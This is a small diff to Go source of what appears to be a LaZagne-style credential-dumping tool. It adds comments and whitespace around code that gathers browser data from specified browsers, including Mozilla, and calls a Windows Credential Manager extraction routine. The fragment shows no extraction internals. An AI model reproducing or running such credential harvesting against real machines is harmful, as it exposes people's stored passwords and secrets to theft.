@@ -70,6 +70,7 @@ func (config LazagneLockPick) ExtractData() {
 
 	}
 
+	// Work with specified browsers
 	if len(config.BrowsersSpecify) > 0 {
 
 		for i := range config.BrowsersSpecify {
@@ -89,9 +90,13 @@ func (config LazagneLockPick) ExtractData() {
 				if mozillaExtract.Success == true {
 					config.Result.BrowserData = append(config.Result.BrowserData, mozillaExtract.Data...)
 				}
+
 			}
+
 		}
+
 	}
+	// End work with  specified browsers
 
 	if config.CredentialManager == true {
 		var credmanData, lengthCredmanData = ExtractCredmanData()
